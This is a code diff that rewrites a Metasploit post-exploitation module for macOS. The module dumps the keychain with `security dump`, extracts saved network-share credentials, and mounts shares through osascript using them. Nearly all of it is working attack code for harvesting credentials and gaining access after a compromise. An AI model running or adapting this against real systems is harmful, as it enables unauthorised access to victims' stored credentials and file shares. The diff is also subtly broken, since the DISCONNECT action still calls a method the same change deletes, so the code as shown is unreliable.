@@ -13,9 +13,9 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name'          => 'OSX ',
+        'Name'          => 'OSX Network Share Mounter',
         'Description'   => %q{
-          This module lists VPN connections and tries to connect to them using stored credentials.
+          This module lists saved network shares and tries to connect to them using stored credentials.
         },
         'License'       => MSF_LICENSE,
         'Author'        =>
@@ -25,109 +25,71 @@ class Metasploit3 < Msf::Post
         'Platform'      => [ 'osx' ],
         'SessionTypes'  => [ 'shell', 'meterpreter' ],
         'Actions'       => [
-          [ 'LIST',     { 'Description' => 'Show a list of VPN connections' } ],
-          [ 'CONNECT', { 'Description' => 'Connect to a VPN using stored credentials' } ],
-          [ 'DISCONNECT', { 'Description' => 'Disconnect from a VPN' } ]
+          [ 'LIST',     { 'Description' => 'Show a list of stored network share credentials' } ],
+          [ 'CONNECT', { 'Description' => 'Connect to a network share using stored credentials' } ],
+          [ 'DISCONNECT', { 'Description' => 'Disconnect a mounted volume' } ]
         ],
         'DefaultAction' => 'LIST'
       ))
 
     register_options(
       [
-        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN']),
-        OptString.new('SCUTIL_PATH', [true, 'Path to the scutil executable.', '/usr/sbin/scutil']),
-        OptString.new('NETWORKSETUP_PATH', [true, 'Path to the networksetup executable.', '/usr/sbin/networksetup'])
+        OptString.new('SHARE', [true, 'Name of network share connection. `set ACTION LIST` to get a list.', 'localhost']),
+        OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),
+        OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),
+        OptString.new('PROTOCOL', [true, 'Network share protocol. `set ACTION LIST` to get a list.', 'smb'])
       ], self.class)
 
   end
-
-  STR_CONNECTED = '* (Connected)'
-  STR_DISCONNECTED = '* (Disconnected)'
 
   def run
     fail_with("Invalid action") if action.nil?
 
     if action.name == 'LIST'
-      data = get_vpn_list()
-      connected_names = parse_vpn_connection_names(data, true)
-      disconnected_names = parse_vpn_connection_names(data, false)
-      if connected_names.length > 0
-        print_status("VPN Connections Status: UP")
-        connected_names.each do |vpn_name|
-          print_good('  ' + vpn_name)
-        end
-      end
-      if disconnected_names.length > 0
-        print_status("VPN Connections Status: DOWN")
-        disconnected_names.each do |vpn_name|
-          print_good('  ' + vpn_name)
+      data = get_share_list()
+      if data.length == 0
+        print_status("No Network Share credentials were found in the keyrings")
+      else
+        print_status("Protocol\tShare Name")
+        data.each do |line|
+          print_good(line)
         end
       end
     elsif action.name == 'CONNECT'
-      connect_vpn(true)
+      connect()
     elsif action.name == 'DISCONNECT'
       connect_vpn(false)
     end
   end
 
-  def get_vpn_list()
-    vprint_status(datastore['SCUTIL_PATH'].shellescape + " --nc list")
-    data = cmd_exec(datastore['SCUTIL_PATH'].shellescape + " --nc list")
-    return data
-  end
-
-  def parse_vpn_connection_names(data, show_up)
-    lines = data.split(/\n/).map(&:strip)
-    connection_names = Array.new()
-
-    lines.each do |line|
-      if show_up && line.start_with?(STR_CONNECTED)
-        connection_names.push(line.split('"')[1])
-      elsif !show_up && line.start_with?(STR_DISCONNECTED)
-        connection_names.push(line.split('"')[1])
+  def get_share_list()
+    vprint_status(datastore['SECURITY_PATH'].shellescape + " dump")
+    data = cmd_exec(datastore['SECURITY_PATH'].shellescape + " dump")
+    # Grep for desc srvr and ptcl
+    tmp = Array.new()
+    data.split("\n").each do |line|
+      unless line !~ /desc|srvr|ptcl/
+        tmp.push(line)
       end
     end
-    return connection_names
-  end
-
-  def connect_vpn(up)
-    vpn_name = datastore['VPN_CONNECTION']
-    if up
-      header = "Connecting to VPN: #{vpn_name}"
-      connection_state = STR_CONNECTED
-      connection_unnecessary = "#{vpn_name} already connected"
-    else
-      header = "Disconnecting from VPN: #{vpn_name}"
-      connection_state = STR_DISCONNECTED
-      connection_unnecessary = "#{vpn_name} already disconnected"
-    end
-
-    print_status(header)
-    data = get_vpn_list()
-    lines = data.split(/\n/).map(&:strip)
-
-    identifier = nil
-    lines.each do |line|
-      if line.split('"')[1] == vpn_name
-        if line.start_with?(connection_state)
-          print_status(connection_unnecessary)
-          return
-        end
-        identifier = line.split(' ')[2]
-        break
+    # Go through the list, find the saved Network Password descriptions
+    # and their corresponding ptcl and srvr attributes
+    list = Array.new()
+    for x in 0..tmp.length-1
+      if tmp[x] =~ /"desc"<blob>="Network Password"/
+        protocol = tmp[x+1].gsub(/^.*\=\"/, '').gsub(/\w*\"\w*$/, '')
+        server = tmp[x+2].gsub(/^.*\=\"/, '').gsub(/\"\w*$/, '')
+        list.push(protocol + "\t" + server)
       end
     end
+    return list.sort
+  end
 
-    if identifier.nil?
-      print_error("#{vpn_name} not found")
-      return
-    end
-
-    if up
-      cmd = datastore['NETWORKSETUP_PATH'].shellescape + " -connectpppoeservice '#{vpn_name}'"
-    else
-      cmd = datastore['SCUTIL_PATH'].shellescape + " --nc stop #{identifier}"
-    end
+  def connect()
+    share_name = datastore['SHARE'].shellescape
+    protocol = datastore['PROTOCOL'].shellescape
+    print_status("Connecting to #{protocol}://#{share_name}")
+    cmd = "osascript -e 'tell app \"finder\" to mount volume \"#{protocol}://#{share_name}\"'"
     vprint_status(cmd)
     cmd_exec(cmd)
   end
